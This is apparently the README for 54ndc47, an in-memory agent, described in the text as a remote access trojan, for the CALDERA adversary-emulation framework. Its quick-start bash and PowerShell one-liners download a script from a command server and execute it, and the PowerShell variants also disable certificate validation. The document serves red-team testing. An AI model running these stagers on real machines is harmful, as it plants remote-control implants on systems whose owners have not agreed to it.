# 54ndc47

54ndc47 is an in-memory agent - or remote access trojan (RAT) - which connects to
CALDERA via HTTP. Once connected, it registers itself as an agent and periodically
asks for instructions on what to do next. Instructions are in the form of an encoded
shell command. 

## Quick start

Start the agent on a Linux or OSX box with either of the bash commands below. Note, the second 
command attaches a group (for example, named 'client') to the agent when it first registers.

```
eval "$(curl -sk -X POST -H "file:54ndc47.sh" https://localhost:8888/file/render)"
eval "$(curl -sk -X POST -H "file:54ndc47.sh" https://localhost:8888/file/render?group=client)"
```

Similarly, you can start the agent on Windows machine with either of the following:

These commands are more verbose then the bash ones because they dynamically accommodate all versions of 
PowerShell, from 3.0+. 

```
$url="https://localhost:8888/file/render"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);}
$url="https://localhost:8888/file/render?group=client"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);}
```

## Operating systems

Currently, 54ndc47 will run on any Linux, OSX or Windows machine.
